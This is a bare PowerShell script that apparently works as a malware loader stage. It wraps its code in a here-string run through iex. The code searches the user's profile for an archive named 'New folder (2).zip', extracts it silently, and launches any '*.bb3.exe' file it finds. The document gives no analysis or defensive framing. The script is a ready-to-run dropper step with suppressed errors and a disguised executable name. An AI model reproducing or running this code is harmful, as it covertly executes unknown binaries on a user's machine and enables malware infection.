$bb3 = @'
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Step 1: Search for the zip file in user's directory
$zipFile = Get-ChildItem -Path "$env:USERPROFILE" -Filter "New folder (2).zip" -Recurse -ErrorAction SilentlyContinue -Force | Select-Object -First 1

# Step 2: If found, extract it to the user's root folder
if ($zipFile) {
    $extractPath = "$env:USERPROFILE"
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile.FullName, $extractPath)
}

# Step 3: Search for .bb3.exe in the extracted location
$found = Get-ChildItem -Path $extractPath -Filter *.bb3.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
if ($found) {
    Start-Process $found.FullName
}
'@
iex $bb3
